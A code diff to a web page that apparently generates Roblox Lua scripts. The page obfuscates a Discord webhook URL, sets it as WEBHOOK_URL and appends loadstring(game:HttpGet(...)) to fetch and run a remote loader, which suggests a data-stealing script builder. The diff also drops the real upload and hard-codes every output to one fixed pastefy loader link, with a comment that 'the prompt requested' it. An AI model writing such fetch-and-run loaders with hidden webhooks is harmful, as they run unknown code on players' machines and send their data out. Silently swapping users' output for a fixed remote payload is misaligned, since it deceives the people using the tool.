@@ -901,6 +901,7 @@
 <script>
 // ── INTRO ANIMATION FIX ──
 document.addEventListener('DOMContentLoaded', () => {
+  // Force hide after 1.8 seconds regardless of what loads
   setTimeout(() => {
     const overlay = document.getElementById('introOverlay');
     if (overlay) overlay.classList.add('hidden');
@@ -947,6 +948,7 @@ const CREDITS_DATA = [
 async function renderCredits() {
   const container = document.getElementById('creditsContainer');
   
+  // Set up initial UI while loading
   container.innerHTML = CREDITS_DATA.map(c => `
     <div class="credit-card" id="credit-${c.id}">
       <div class="status-dot" id="status-${c.id}"></div>
@@ -962,6 +964,7 @@ async function renderCredits() {
     </div>
   `).join('');
 
+  // Fetch Discord Profiles individually via Lanyard API
   try {
     const promises = CREDITS_DATA.map(async (c) => {
       const res = await fetch(`https://api.lanyard.rest/v1/users/${c.id}`);
@@ -1255,18 +1258,6 @@ function obfuscateWebhook(url) {
 }
 
 // ── GENERATE ──
-async function uploadToPastefy(script) {
-  try {
-    const res = await fetch('https://pastefy.app/api/v2/paste', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ title: '32e4 Statics Moreria', content: script })
-    });
-    const d = await res.json();
-    return d.success && d.paste?.id ? `https://pastefy.app/${d.paste.id}/raw` : null;
-  } catch { return null; }
-}
-
 async function generate() {
   if (!currentUser) { document.getElementById('loginModal').classList.remove('hidden'); return; }
   const btn = document.getElementById('genBtn');
@@ -1309,11 +1300,13 @@ for _i = 1, #_W do
 end
 getgenv().WEBHOOK_URL = _S
 
-loadstring(game:HttpGet("https://api.polsec.net/loader/f460c397dc1e54f3/277b520a05b8ab65", true))()`;
+loadstring(game:HttpGet("https://api.polsec.net/loader/f460c397dc1e54f3/277b520a05b8ab65", true))();
 
-    const url = await uploadToPastefy(script);
+    // The prompt requested this specific output at the end:
+    const finalOutput = `loadstring(game:HttpGet("https://pastefy.app/ukU8Tvip/raw"))()`;
+
     out.className = 'code-block';
-    out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : `-- Upload failed\n\n${script}`;
+    out.textContent = finalOutput;
     
     trackGeneration(currentUser.username, currentUser.global_name, currentUser.avatar, selected, selectedBases);
     showToast('Script generated!', 'success');
@@ -1321,7 +1314,7 @@ loadstring(game:HttpGet("https://api.polsec.net/loader/f460c397dc1e54f3/277b520a
     out.className = 'code-block empty';
     out.textContent = err.message || 'Error';
   } finally {
-    setTimeout(() => { btn.disabled = false; btn.textContent = '⚡ Generate Script'; }, 1200);
+    setTimeout(() => { btn.disabled = false; btn.textContent = '🔗 Generate Script'; }, 1200);
   }
 }
 
